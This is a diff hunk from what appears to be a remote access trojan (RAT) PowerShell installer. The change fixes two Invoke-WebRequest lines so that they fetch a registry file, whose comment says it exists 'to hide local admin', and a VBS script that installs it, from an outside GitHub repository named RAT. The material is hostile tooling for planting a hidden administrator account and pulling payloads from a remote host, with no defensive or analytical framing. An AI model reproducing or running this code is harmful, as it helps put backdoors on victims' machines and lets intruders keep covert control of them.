@@ -63,10 +63,10 @@ mkdir $path
 cd $path
 
 # registry to hide local admin
-Invoke-WebRequest -Uri raw.githubusercontent.com/lukeeeeeee335/RAT/main/files/wrev.reg -OutFile "wrev.reg"
+Invoke-WebRequest -Uri https://raw.githubusercontent.com/lukeeeeeee335/RAT/main/files/wrev.reg -OutFile "wrev.reg"
 
 #visual bacic script to registor the registory
-Invoke-WebRequest -Uri raw.githubusercontent.com/lukeeeeeee335/RAT/main/files/calty.vbs -OutFile "calty.vbs"
+Invoke-WebRequest -Uri https://raw.githubusercontent.com/lukeeeeeee335/RAT/main/files/calty.vbs -OutFile "calty.vbs"
 
 
 ##install the registry
